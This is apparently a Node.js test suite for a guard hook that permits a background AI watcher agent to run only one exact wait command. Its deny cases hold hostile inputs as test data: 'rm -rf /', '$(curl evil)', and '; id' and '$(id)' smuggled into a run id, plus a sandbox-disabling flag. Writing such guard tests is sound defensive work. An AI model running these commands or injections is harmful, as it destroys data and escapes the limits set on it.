import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { test } from "node:test";
import { fileURLToPath } from "node:url";

const here = dirname(fileURLToPath(import.meta.url));
const guard = join(here, "team-watcher-guard.mjs");
const definition = readFileSync(join(here, "..", "agents", "team-watcher.md"), "utf8");

// The command the definition tells the watcher to run, so the two cannot drift.
const template = definition.match(/```sh\n(.+)\n```/)[1];
const wait = template.replace("<run_id>", "run_087dc1f58ad4");
const cli = 'timeout 330 "${ORCA_CLI_COMMAND:?ORCA_CLI_COMMAND is not set}"';

function run(toolInput) {
  const { status, stdout } = spawnSync(process.execPath, [guard], {
    input: JSON.stringify({ tool_name: "Bash", tool_input: toolInput }),
    encoding: "utf8",
  });
  assert.equal(status, 0);
  return JSON.parse(stdout).hookSpecificOutput;
}

const allowed = (toolInput) => assert.equal(run(toolInput).permissionDecision, "allow");
const denied = (toolInput) => assert.equal(run(toolInput).permissionDecision, "deny");

test("allows the documented wait", () => {
  allowed({ command: wait, timeout: 600000 });
  allowed({ command: wait, timeout: 600000, run_in_background: false });
});

test("denies every coordinator action", () => {
  for (const action of [
    "check --ack delivery_1 --json",
    'check --ack delivery_1 --wait --types "worker_done,escalation,question" --run run_1 --timeout-ms 300000 --json',
    "check --json",
    'reply --id msg_1 --body "ok" --json',
    "worker-release --dispatch d_1 --json",
    "worker-stop --dispatch d_1 --json",
    "worker-abandon --dispatch d_1 --json",
    "worker-start --task t_1 --json",
    "worker-list --json",
    "run-use --id run_1 --json",
    'send --to run:x --body "ok" --json',
  ]) {
    denied({ command: `${cli} orchestration ${action}`, timeout: 600000 });
  }
});

test("denies anything chained onto, or changed in, the wait", () => {
  for (const command of [
    `${wait}; orca-ide orchestration reply --id m --body x`,
    `${wait} && rm -rf /`,
    `${wait} | tee /tmp/x`,
    `${wait}\necho done`,
    `${wait}\n`,
    ` ${wait}`,
    `${wait} --ack delivery_1`,
    wait.replace("--wait", "--wait --ack delivery_1"),
    wait.replace("--wait", "--peek --wait"),
    wait.replace("worker_done,escalation,question", "status"),
    wait.replace("--timeout-ms 300000", ""),
    wait.replace("300000", "540000"),
    wait.replace(cli, "orca-ide"),
    wait.replace(cli, "$(curl evil)"),
    wait.replace("timeout 330 ", ""),
    wait.replace("timeout 330", "timeout 9999"),
    "printenv ORCA_CLI_COMMAND",
    "echo report",
    "",
  ]) {
    denied({ command, timeout: 600000 });
  }
});

test("denies a wait that is not pinned to one real Run id", () => {
  for (const command of [
    template,
    wait.replace(" --run run_087dc1f58ad4", ""),
    wait.replace("run_087dc1f58ad4", "run_legacy_local"),
    wait.replace("run_087dc1f58ad4", "run_087dc1f58ad4; id"),
    wait.replace("run_087dc1f58ad4", '"$(id)"'),
    wait.replace("run_087dc1f58ad4", "run_"),
    wait.replace("run_087dc1f58ad4", "run_abc --run run_def"),
  ]) {
    denied({ command, timeout: 600000 });
  }
});

test("denies a call that would lose the wait's result", () => {
  denied({ command: wait });
  denied({ command: wait, timeout: 120000 });
  denied({ command: wait, timeout: 600000, run_in_background: true });
  denied({ command: wait, timeout: 600000, dangerouslyDisableSandbox: true });
});

test("a denial tells the watcher how to fix the call", () => {
  assert.match(run({ command: wait }).permissionDecisionReason, /timeout: 600000/);
  assert.match(run({ command: "echo hi" }).permissionDecisionReason, /exact wait command/);
});

test("crashes on malformed input, which the frontmatter turns into a block", () => {
  const { status } = spawnSync(process.execPath, [guard], { input: "not json", encoding: "utf8" });
  assert.notEqual(status, 0);
  assert.match(definition, /onFailure: block/);
});

test("the definition keeps the watcher cheap, backgrounded, and Bash only", () => {
  assert.match(definition, /^model: haiku$/m);
  assert.match(definition, /^background: true$/m);
  assert.match(definition, /^tools: Bash$/m);
});

test("maxTurns stays a hard ceiling just above the leg cap", () => {
  // Haiku miscounted past 4 legs, so a larger value is refused, and 4 waits plus
  // the final reply and one spare turn are enforced by Claude Code itself.
  assert.match(definition, /from 1 to 4\./);
  assert.match(definition, /^maxTurns: 6$/m);
});
